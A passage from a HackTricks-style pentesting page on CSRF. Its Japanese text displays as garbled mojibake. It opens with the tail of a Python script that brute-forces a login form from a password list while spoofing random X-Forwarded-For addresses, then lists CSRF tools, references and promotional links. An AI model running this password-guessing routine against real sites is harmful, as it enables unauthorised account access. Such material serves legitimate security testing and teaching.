"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## ãƒ„ãƒ¼ãƒ« <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã‚¦ã‚§ãƒ–3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã¶ãŸã‚ã«**

ğŸ ã‚¦ã‚§ãƒ–3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³**](https://opensea.io/collection/the-peass-family)
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«PRã‚’æå‡ºã—ã¦** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«å‚åŠ ã—ã¦ãã ã•ã„ã€‚**

</details>
